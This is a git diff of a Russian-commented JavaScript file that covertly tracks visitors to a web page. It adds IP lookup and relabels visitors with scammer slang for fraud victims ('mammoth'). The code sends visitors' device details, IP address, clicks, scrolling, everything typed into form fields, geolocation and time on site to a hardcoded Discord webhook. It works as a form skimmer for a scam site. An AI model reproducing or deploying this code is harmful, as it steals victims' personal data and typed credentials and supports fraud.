@@ -1,22 +1,28 @@
 const webhookURL = 'https://discord.com/api/webhooks/1303384530895372338/orvIQvUJHq86vnrecZ5tNFzw1UGCH2LAy18RjtJmTNSdhgd8yaDSZSdTlevLid7EGcjB';
 
 // Функция для получения информации о пользователе
-function getUserInfo() {
+async function getUserInfo() {
     const userAgent = navigator.userAgent; // Получаем информацию о браузере/устройстве
     const timestamp = new Date().toLocaleString(); // Получаем текущее время
 
+    // Получаем IP-адрес пользователя
+    const ipResponse = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipResponse.json();
+
     return {
         phoneInfo: userAgent,
-        visitTime: timestamp
+        visitTime: timestamp,
+        ipAddress: ipData.ip
     };
 }
 
 // Функция для отправки данных в Discord через вебхук
 function sendToDiscord(data) {
     const message = {
-        content: `Новый визит:
-        - Телефон: ${data.phoneInfo}
-        - Время входа: ${data.visitTime}`
+        content: `Мамонт в сайте:
+        - Телефон мамонта: ${data.phoneInfo}
+        - Время входа мамонта: ${data.visitTime}
+        - IP-адрес Мамонта: ${data.ipAddress}`
     };
 
     fetch(webhookURL, {
@@ -39,16 +45,19 @@ function sendToDiscord(data) {
 }
 
 // Получаем данные и отправляем их в Discord при загрузке страницы
-window.onload = () => {
-    const userData = getUserInfo();
+window.onload = async () => {
+    const userData = await getUserInfo();
     sendToDiscord(userData);
+
+    // Записываем время начала визита
+    window.startTime = Date.now();
 };
 
 // Отслеживание кликов по всем кнопкам на странице
 document.querySelectorAll('button').forEach(button => {
     button.addEventListener('click', (event) => {
         const actionData = {
-            action: 'Клик по кнопке',
+            action: 'Мамонт нажал на кнопку',
             buttonText: event.target.innerText
         };
         sendToDiscord(actionData);
@@ -58,7 +67,7 @@ document.querySelectorAll('button').forEach(button => {
 // Отслеживание скроллинга
 window.addEventListener('scroll', () => {
     const scrollData = {
-        action: 'Прокрутка страницы',
+        action: 'Мамонт скролит сайт',
         scrollY: window.scrollY
     };
     sendToDiscord(scrollData);
@@ -68,7 +77,7 @@ window.addEventListener('scroll', () => {
 document.querySelectorAll('a').forEach(link => {
     link.addEventListener('click', (event) => {
         const linkData = {
-            action: 'Клик по ссылке',
+            action: 'Мамонт кликнул по ссылке',
             linkHref: event.target.href
         };
         sendToDiscord(linkData);
@@ -79,7 +88,7 @@ document.querySelectorAll('a').forEach(link => {
 document.querySelectorAll('input, textarea').forEach(input => {
     input.addEventListener('input', (event) => {
         const inputData = {
-            action: 'Изменение ввода',
+            action: 'Мамонт дал данные',
             inputType: event.target.type,
             inputValue: event.target.value
         };
@@ -121,7 +130,7 @@ function sendLocationToWebhook(position) {
     const longitude = position.coords.longitude;
 
     const message = {
-        content: `Местоположение пользователя:\nШирота: ${latitude}\nДолгота: ${longitude}`
+        content: `Местоположение пользователя:\nШирота Мамонта: ${latitude}\nДолгота Мамонта: ${longitude}`
     };
 
     fetch(webhookURL, {
@@ -161,4 +170,17 @@ function showError(error) {
     }
 }
 
-// Добавляем обработчик события для кноп
+// Отправка времени, проведенного на сайте, при уходе со страницы
+window.onbeforeunload = () => {
+    const endTime = Date.now();
+    const timeSpent = Math.round((endTime - window.startTime) / 1000); // Время в секундах
+
+    const timeSpentData = {
+        action: 'Время Мамонта на сайте',
+        timeSpent: `${timeSpent} секунд`
+    };
+    sendToDiscord(timeSpentData);
+};
+
+// Добавляем обработчик события для кнопки получения местоположения
+document.getElementById("getLocationBtn").addEventListener("click", getLocationAndSendToWebhook);
